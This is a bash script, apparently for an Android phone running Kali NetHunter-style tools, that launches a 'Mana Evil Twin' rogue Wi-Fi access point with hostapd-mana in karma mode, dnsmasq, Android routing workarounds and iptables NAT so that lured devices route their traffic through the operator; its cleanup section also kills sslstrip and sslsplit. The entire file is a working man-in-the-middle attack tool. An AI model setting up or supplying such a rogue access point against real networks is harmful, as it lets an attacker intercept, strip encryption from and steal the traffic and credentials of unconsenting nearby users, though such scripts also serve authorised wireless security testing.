#!/bin/bash
# Mana Evil Twin - fixed for SM-G781B / Android 16 / LineageOS 23.2
# Key fixes:
#   1. Interface DOWN before hostapd (required for AP mode switch on MT76x2u)
#   2. Uses chroot dnsmasq (system v2.51 sends DHCP replies on wrong interface)
#   3. Android policy routing fix (rule 32000 = unreachable blocks forwarding)
#   4. Flushes tetherctrl_FORWARD DROP-all rule
#   5. wmm_enabled=1 required (without it MT76x2u has 80%+ TX failures)

upstream=wlan0
phy=wlan1
conf=/sdcard/nh_files/configs/hostapd-karma.conf
hostapd=/usr/sbin/hostapd-mana

echo "[*] Starting Mana Evil Twin AP..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Unblock radio
rfkill unblock wlan

# Interface MUST be DOWN before hostapd can switch to AP mode
echo "[*] Preparing interface $phy..."
ip link set $phy down
sleep 1
ip addr flush dev $phy

# Fix the hostapd config interface line
sed -i "s/^interface=.*$/interface=$phy/" $conf

# Start hostapd-mana
echo "[*] Starting hostapd-mana..."
$hostapd $conf &
sleep 3

# Set AP IP after hostapd starts
ip addr add 10.0.0.1/24 dev $phy
ip link set $phy up

# Start DHCP+DNS using chroot dnsmasq (NOT system dnsmasq)
# System dnsmasq v2.51 sends DHCP replies on the wrong interface (wlan0 instead of wlan1)
echo "[*] Starting dnsmasq (chroot v2.93)..."
/usr/sbin/dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
sleep 2

# Fix Android policy routing
# Rule 32000 = "from all unreachable" blocks ALL forwarded traffic
# ip rules with "iif lo" only match locally-originated packets
ip rule del from 10.0.0.0/24 lookup main 2>/dev/null
ip rule del iif $phy lookup main 2>/dev/null
ip rule add from 10.0.0.0/24 lookup main prio 9000
ip rule add iif $phy lookup main prio 9001

# Also add route in the dynamic table (original mana approach)
for table in $(ip rule list | awk -F"lookup" "{print \$2}"); do
    DEF=$(ip route show table $table 2>/dev/null | grep default | grep $upstream)
    if [ -n "$DEF" ]; then
        break
    fi
done
if [ -n "$table" ]; then
    ip route add 10.0.0.0/24 dev $phy scope link table $table 2>/dev/null
fi

# Flush Android bandwidth/tether chains that block forwarding
iptables -F bw_INPUT 2>/dev/null
iptables -F bw_OUTPUT 2>/dev/null
iptables -F tetherctrl_FORWARD 2>/dev/null

# Save current iptables for restore
iptables-save > /tmp/rules.txt
sed --in-place "/rmnet0/d" /tmp/rules.txt
sed --in-place "/TCPMSS/d" /tmp/rules.txt

# Set up NAT and forwarding
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -I FORWARD 1 -i $phy -o $upstream -j ACCEPT
iptables -I FORWARD 2 -i $upstream -o $phy -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[+] Evil Twin AP running!"
echo "    Stop with: hit Enter"
echo ""
read

# Cleanup
echo "[*] Stopping..."
pkill dnsmasq
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python

# Restore iptables
iptables-restore < /tmp/rules.txt
rm -f /tmp/rules.txt

# Remove policy routing rules
ip rule del from 10.0.0.0/24 lookup main 2>/dev/null
ip rule del iif $phy lookup main 2>/dev/null

# Reset interface
ip addr flush dev $phy
ip link set $phy down

echo "[+] Stopped."
